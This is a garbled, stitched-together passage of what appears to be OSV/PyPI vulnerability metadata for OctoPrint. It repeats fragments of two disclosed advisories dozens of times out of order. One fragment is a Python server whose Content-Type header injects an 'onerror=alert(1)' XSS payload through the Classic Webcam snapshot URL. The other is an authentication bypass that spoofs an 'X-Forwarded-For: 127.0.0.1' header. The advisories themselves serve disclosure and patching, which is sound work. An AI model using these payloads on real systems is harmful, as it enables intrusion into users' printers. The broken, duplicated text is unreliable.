Create a URL that responds with a malicious content type. For example, creating the following python script:\n   ```\n   from http.server import BaseHTTPRequestHandler, HTTPServer\n\n   class MyHTTPRequestHandler(BaseHTTPRequestHandler):\n       def do_GET(self):\n           self.send_response(200)\n           self.send_header('Content-Type', 'image/\"onerror=\"alert(1)\"')\n           self.end_headers()\n           self.wfile.write(b'Ok')\n\n   def run():\n       server_address = ('', 8080)\n       httpd = HTTPServer(server_address, MyHTTPRequestHandler)\n       print('Server listening on 0.0.0.0:8080...')\n       httpd.serve_forever()\n\n   if __name__ == '__main__':\n       run()\n   ```\n\n2. Go to OctoPrint settings --> Plugins --> Classic Webcam and enter the URL of that page as the Snapshot URL. \n\n3. Click on the \"Test\" button to trigger XSS.

Create a URL that responds with a malicious content type. For example, creating the following python script:\n   ```\n   from http.server import BaseHTTPRequestHandler, HTTPServer\n\n   class MyHTTPRequestHandler(BaseHTTPRequestHandler):\n       def do_GET(self):\n           self.send_response(200)\n           self.send_header('Content-Type', 'image/\"onerror=\"alert(1)\"')\n           self.end_headers()\n           self.wfile.write(b'Ok')\n\n   def run():\n       server_address = ('', 8080)\n       httpd = HTTPServer(server_address, MyHTTPRequestHandler)\n       print('Server listening on 0.0.0.0:8080...')\n       httpd.serve_forever()\n\n   if __name__ == '__main__':\n       run()\n   ```\n\n2. Go to OctoPrint settings --> Plugins --> Classic Webcam and enter the URL of that page as the Snapshot URL. \n\n3. Click on the \"Test\" button to trigger XSS. A Javascript alert should appear, demonstrating the actual code injection.\n\n### Credits\n\nThis vulnerability was discovered and responsibly disclosed to OctoPrint by Jacopo Tediosi.","fixed_in":["1.10.0rc3"],"id":"GHSA-x7mf-wrh9-r76c","link":"https://osv.dev/vulnerability/GHSA-x7mf-wrh9-r76c","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-32977"],"details":"### Impact\n\nOctoPrint versions up until and including 1.10.0 contain a vulnerability that allows an unauthenticated attacker to completely bypass the authentication **if the `autologinLocal` option is enabled** within `config.yaml`, even if they come from networks that are not configured as `localNetworks`, by spoofing their IP via the `X-Forwarded-For` header.\n\nIf autologin is not enabled, this vulnerability does not have any impact.\n\n### Patches\n\nThe vulnerability has been patched in version 1.10.1.\n\n### Workaround\n\nUntil the patch has been applied, OctoPrint administrators who have autologin enabled on their instances should disable it and/or to make the instance inaccessible from potentially hostile networks like the internet.\n\n### PoC\n\n1.

Enable the `autologinAs` configuration within the `accessControl` section in the [OctoPrint yaml configuration file](https://docs.octoprint.org/en/master/configuration/config_yaml.html#access-control)\n2. Set your browser to add the `X-Forwarded-For: 127.0.0.1` header to HTTP requests. For example, this can be done using proxy software like Burp Suite. Alternatively, there are browser extensions such as https://github.com/MisterPhilip/x-forwarded-for, but I haven't tried them.\n3.

A global change throughout all of OctoPrint's templating system with the upcoming 1.11.0 release will handle this further, switching to globally enforced automatic escaping and thus reducing the attack surface in general.\n\nThe latter will also improve the security of third party plugins. During a transition period, third party plugins will be able to opt into the automatic escaping. With OctoPrint 1.13.0, automatic escaping will be switched over to be enforced even for third party plugins, unless they explicitly opt-out.\n\n### Credits\n\nThis vulnerability was discovered and responsibly disclosed to OctoPrint by Jacopo Tediosi.\n","fixed_in":["1.10.3"],"id":"GHSA-xvxq-g8hw-fx4g","link":"https://osv.dev/vulnerability/GHSA-xvxq-g8hw-fx4g","source":"osv","summary":null,"withdrawn":null}]},"1.10.3":{"info":{"author":"Gina Häußge","author_email":"gina@octoprint.org","bugtrack_url":null,"classifiers":["Development Status :: 5 - Production/Stable","Environment :: Web Environment","Framework :: Flask","Intended Audience :: Developers","Intended Audience :: Education","Intended Audience :: End Users/Desktop","Intended Audience :: Manufacturing","Intended Audience :: Other Audience","Intended Audience :: Science/Research","License :: OSI Approved :: GNU Affero General Public License v3","Natural Language :: English","Natural Language :: German","Operating System :: OS Independent","Programming Language :: JavaScript","Programming Language :: Python","Programming Language :: Python :: 3","Programming Language :: Python :: 3 :: Only","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.7","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9","Programming Language :: Python :: Implementation :: CPython","Topic :: Printing","Topic :: System :: Monitoring"],"description_content_type":"text/markdown","docs_url":null,"download_url":null,"downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://octoprint.org","keywords":"3dprinting 3dprinter 3d-printing 3d-printer octoprint","license":"GNU Affero General Public License v3","maintainer":null,"maintainer_email":null,"name":"OctoPrint","package_url":"https://pypi.org/project/OctoPrint/","platform":null,"project_url":"https://pypi.org/project/OctoPrint/","project_urls":{"Bug Reports":"https://github.com/OctoPrint/OctoPrint/issues","Community Forum":"https://community.octoprint.org","Funding":"https://support.octoprint.org","Homepage":"https://octoprint.org","Source":"https://github.com/OctoPrint/OctoPrint"},"provides_extra":["develop","docs","plugins"],"release_url":"https://pypi.org/project/OctoPrint/1.10.3/","requires_dist":["OctoPrint-FileCheck>=2024.3.27","OctoPrint-FirmwareCheck>=2021.10.11","OctoPrint-PiSupport>=2023.10.10","argon2-cffi>=23.1.0","Babel<2.13,>=2.12.1","cachelib<0.11,>=0.10.2","Click<9,>=8.1.7","colorlog<7,>=6.7.0","emoji<3,>=2.10.1","feedparser<7,>=6.0.11","filetype<2,>=1.2.0","Flask-Assets<3,>=2.1.0","Flask-Babel<4,>=3.1.0","Flask-Login<0.7,>=0.6.3","Flask-Limiter<4,>=3.5.0","flask<2.3,>=2.2.3","frozendict<3,>=2.4.0","future<1,>=0.18.3","markdown<3.5,>=3.4.4","netaddr<0.9,>=0.8","netifaces<0.12,>=0.11.0","passlib<2,>=1.7.4","pathvalidate<3,>=2.5.2","pkginfo<2,>=1.9.6","psutil<6,>=5.9.8","pydantic==1.10.16","pylru<2,>=1.2.1","pyserial<4,>=3.5","pytz","PyYAML<7,>=6.0.1","requests<3,>=2.31.0","sarge==0.1.7.post1","semantic-version<3,>=2.10.0","sentry-sdk<2,>=1.40.0","setuptools","tornado<6.3,>=6.2","watchdog<3,>=2.3.1","websocket-client==1.6.1","werkzeug<2.3,>=2.2.3","wrapt<1.16,>=1.15","zeroconf~=0.127","zipstream-ng<2.0.0,>=1.7.1","blinker<1.7.0,>=1.6.3","class-doc<0.3,>=0.2.6","regex","unidecode","wheel","appdirs<2,>=1.4.4;

Enable the `autologinAs` configuration within the `accessControl` section in the [OctoPrint yaml configuration file](https://docs.octoprint.org/en/master/configuration/config_yaml.html#access-control)\n2. Set your browser to add the `X-Forwarded-For: 127.0.0.1` header to HTTP requests. For example, this can be done using proxy software like Burp Suite. Alternatively, there are browser extensions such as https://github.com/MisterPhilip/x-forwarded-for, but I haven't tried them.\n3.

A global change throughout all of OctoPrint's templating system with the upcoming 1.11.0 release will handle this further, switching to globally enforced automatic escaping and thus reducing the attack surface in general.\n\nThe latter will also improve the security of third party plugins.

A global change throughout all of OctoPrint's templating system with the upcoming 1.11.0 release will handle this further, switching to globally enforced automatic escaping and thus reducing the attack surface in general.\n\nThe latter will also improve the security of third party plugins.

Set your browser to add the `X-Forwarded-For: 127.0.0.1` header to HTTP requests. For example, this can be done using proxy software like Burp Suite.

Set your browser to add the `X-Forwarded-For: 127.0.0.1` header to HTTP requests. For example, this can be done using proxy software like Burp Suite.

Enable the `autologinAs` configuration within the `accessControl` section in the [OctoPrint yaml configuration file](https://docs.octoprint.org/en/master/configuration/config_yaml.html#access-control)\n2. Set your browser to add the `X-Forwarded-For: 127.0.0.1` header to HTTP requests. For example, this can be done using proxy software like Burp Suite.

Set your browser to add the `X-Forwarded-For: 127.0.0.1` header to HTTP requests. For example, this can be done using proxy software like Burp Suite.

Set your browser to add the `X-Forwarded-For: 127.0.0.1` header to HTTP requests. For example, this can be done using proxy software like Burp Suite.

Enable the `autologinAs` configuration within the `accessControl` section in the [OctoPrint yaml configuration file](https://docs.octoprint.org/en/master/configuration/config_yaml.html#access-control)\n2. Set your browser to add the `X-Forwarded-For: 127.0.0.1` header to HTTP requests. For example, this can be done using proxy software like Burp Suite.

Enable the `autologinAs` configuration within the `accessControl` section in the [OctoPrint yaml configuration file](https://docs.octoprint.org/en/master/configuration/config_yaml.html#access-control)\n2. Set your browser to add the `X-Forwarded-For: 127.0.0.1` header to HTTP requests. For example, this can be done using proxy software like Burp Suite.

Go to OctoPrint settings --> Plugins --> Classic Webcam and enter the URL of that page as the Snapshot URL. \n\n3. Click on the \"Test\" button to trigger XSS.

Set your browser to add the `X-Forwarded-For: 127.0.0.1` header to HTTP requests. For example, this can be done using proxy software like Burp Suite.

Set your browser to add the `X-Forwarded-For: 127.0.0.1` header to HTTP requests. For example, this can be done using proxy software like Burp Suite.

Go to OctoPrint settings --> Plugins --> Classic Webcam and enter the URL of that page as the Snapshot URL. \n\n3. Click on the \"Test\" button to trigger XSS.

Enable the `autologinAs` configuration within the `accessControl` section in the [OctoPrint yaml configuration file](https://docs.octoprint.org/en/master/configuration/config_yaml.html#access-control)\n2. Set your browser to add the `X-Forwarded-For: 127.0.0.1` header to HTTP requests. For example, this can be done using proxy software like Burp Suite.

Go to OctoPrint settings --> Plugins --> Classic Webcam and enter the URL of that page as the Snapshot URL. \n\n3. Click on the \"Test\" button to trigger XSS.

Go to OctoPrint settings --> Plugins --> Classic Webcam and enter the URL of that page as the Snapshot URL. \n\n3. Click on the \"Test\" button to trigger XSS.

Enable the `autologinAs` configuration within the `accessControl` section in the [OctoPrint yaml configuration file](https://docs.octoprint.org/en/master/configuration/config_yaml.html#access-control)\n2. Set your browser to add the `X-Forwarded-For: 127.0.0.1` header to HTTP requests. For example, this can be done using proxy software like Burp Suite.

Go to OctoPrint settings --> Plugins --> Classic Webcam and enter the URL of that page as the Snapshot URL. \n\n3. Click on the \"Test\" button to trigger XSS.

Enable the `autologinAs` configuration within the `accessControl` section in the [OctoPrint yaml configuration file](https://docs.octoprint.org/en/master/configuration/config_yaml.html#access-control)\n2. Set your browser to add the `X-Forwarded-For: 127.0.0.1` header to HTTP requests. For example, this can be done using proxy software like Burp Suite.

Go to OctoPrint settings --> Plugins --> Classic Webcam and enter the URL of that page as the Snapshot URL. \n\n3. Click on the \"Test\" button to trigger XSS.

Go to OctoPrint settings --> Plugins --> Classic Webcam and enter the URL of that page as the Snapshot URL. \n\n3. Click on the \"Test\" button to trigger XSS.

Enable the `autologinAs` configuration within the `accessControl` section in the [OctoPrint yaml configuration file](https://docs.octoprint.org/en/master/configuration/config_yaml.html#access-control)\n2. Set your browser to add the `X-Forwarded-For: 127.0.0.1` header to HTTP requests. For example, this can be done using proxy software like Burp Suite.

Go to OctoPrint settings --> Plugins --> Classic Webcam and enter the URL of that page as the Snapshot URL. \n\n3. Click on the \"Test\" button to trigger XSS.

Go to OctoPrint settings --> Plugins --> Classic Webcam and enter the URL of that page as the Snapshot URL. \n\n3. Click on the \"Test\" button to trigger XSS.

Enable the `autologinAs` configuration within the `accessControl` section in the [OctoPrint yaml configuration file](https://docs.octoprint.org/en/master/configuration/config_yaml.html#access-control)\n2. Set your browser to add the `X-Forwarded-For: 127.0.0.1` header to HTTP requests. For example, this can be done using proxy software like Burp Suite.

Go to OctoPrint settings --> Plugins --> Classic Webcam and enter the URL of that page as the Snapshot URL. \n\n3. Click on the \"Test\" button to trigger XSS.

Enable the `autologinAs` configuration within the `accessControl` section in the [OctoPrint yaml configuration file](https://docs.octoprint.org/en/master/configuration/config_yaml.html#access-control)\n2. Set your browser to add the `X-Forwarded-For: 127.0.0.1` header to HTTP requests. For example, this can be done using proxy software like Burp Suite.

Go to OctoPrint settings --> Plugins --> Classic Webcam and enter the URL of that page as the Snapshot URL. \n\n3. Click on the \"Test\" button to trigger XSS.

Enable the `autologinAs` configuration within the `accessControl` section in the [OctoPrint yaml configuration file](https://docs.octoprint.org/en/master/configuration/config_yaml.html#access-control)\n2. Set your browser to add the `X-Forwarded-For: 127.0.0.1` header to HTTP requests. For example, this can be done using proxy software like Burp Suite.

Create a URL that responds with a malicious content type. For example, creating the following python script:\n   ```\n   from http.server import BaseHTTPRequestHandler, HTTPServer\n\n   class MyHTTPRequestHandler(BaseHTTPRequestHandler):\n       def do_GET(self):\n           self.send_response(200)\n           self.send_header('Content-Type', 'image/\"onerror=\"alert(1)\"')\n           self.end_headers()\n           self.wfile.write(b'Ok')\n\n   def run():\n       server_address = ('', 8080)\n       httpd = HTTPServer(server_address, MyHTTPRequestHandler)\n       print('Server listening on 0.0.0.0:8080...')\n       httpd.serve_forever()\n\n   if __name__ == '__main__':\n       run()\n   ```\n\n2. Go to OctoPrint settings --> Plugins --> Classic Webcam and enter the URL of that page as the Snapshot URL. \n\n3. Click on the \"Test\" button to trigger XSS. A Javascript alert should appear, demonstrating the actual code injection.\n\n### Credits\n\nThis vulnerability was discovered and responsibly disclosed to OctoPrint by Jacopo Tediosi.","fixed_in":["1.10.0rc3"],"id":"GHSA-x7mf-wrh9-r76c","link":"https://osv.dev/vulnerability/GHSA-x7mf-wrh9-r76c","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-32977"],"details":"### Impact\n\nOctoPrint versions up until and including 1.10.0 contain a vulnerability that allows an unauthenticated attacker to completely bypass the authentication **if the `autologinLocal` option is enabled** within `config.yaml`, even if they come from networks that are not configured as `localNetworks`, by spoofing their IP via the `X-Forwarded-For` header.\n\nIf autologin is not enabled, this vulnerability does not have any impact.\n\n### Patches\n\nThe vulnerability has been patched in version 1.10.1.\n\n### Workaround\n\nUntil the patch has been applied, OctoPrint administrators who have autologin enabled on their instances should disable it and/or to make the instance inaccessible from potentially hostile networks like the internet.\n\n### PoC\n\n1. Enable the `autologinAs` configuration within the `accessControl` section in the [OctoPrint yaml configuration file](https://docs.octoprint.org/en/master/configuration/config_yaml.html#access-control)\n2. Set your browser to add the `X-Forwarded-For: 127.0.0.1` header to HTTP requests. For example, this can be done using proxy software like Burp Suite. Alternatively, there are browser extensions such as https://github.com/MisterPhilip/x-forwarded-for, but I haven't tried them.\n3.

A global change throughout all of OctoPrint's templating system with the upcoming 1.11.0 release will handle this further, switching to globally enforced automatic escaping and thus reducing the attack surface in general.\n\nThe latter will also improve the security of third party plugins. During a transition period, third party plugins will be able to opt into the automatic escaping.

Enable the `autologinAs` configuration within the `accessControl` section in the [OctoPrint yaml configuration file](https://docs.octoprint.org/en/master/configuration/config_yaml.html#access-control)\n2. Set your browser to add the `X-Forwarded-For: 127.0.0.1` header to HTTP requests. For example, this can be done using proxy software like Burp Suite.

A global change throughout all of OctoPrint's templating system with the upcoming 1.11.0 release will handle this further, switching to globally enforced automatic escaping and thus reducing the attack surface in general.\n\nThe latter will also improve the security of third party plugins.

Enable the `autologinAs` configuration within the `accessControl` section in the [OctoPrint yaml configuration file](https://docs.octoprint.org/en/master/configuration/config_yaml.html#access-control)\n2. Set your browser to add the `X-Forwarded-For: 127.0.0.1` header to HTTP requests. For example, this can be done using proxy software like Burp Suite.

A global change throughout all of OctoPrint's templating system with the upcoming 1.11.0 release will handle this further, switching to globally enforced automatic escaping and thus reducing the attack surface in general.\n\nThe latter will also improve the security of third party plugins.

A global change throughout all of OctoPrint's templating system with the upcoming 1.11.0 release will handle this further, switching to globally enforced automatic escaping and thus reducing the attack surface in general.\n\nThe latter will also improve the security of third party plugins. During a transition period, third party plugins will be able to opt into the automatic escaping. With OctoPrint 1.13.0, automatic escaping will be switched over to be enforced even for third party plugins, unless they explicitly opt-out.\n\n### Credits\n\nThis vulnerability was discovered and responsibly disclosed to OctoPrint by Jacopo Tediosi.\n","fixed_in":["1.10.3"],"id":"GHSA-xvxq-g8hw-fx4g","link":"https://osv.dev/vulnerability/GHSA-xvxq-g8hw-fx4g","source":"osv","summary":null,"withdrawn":null}]}}
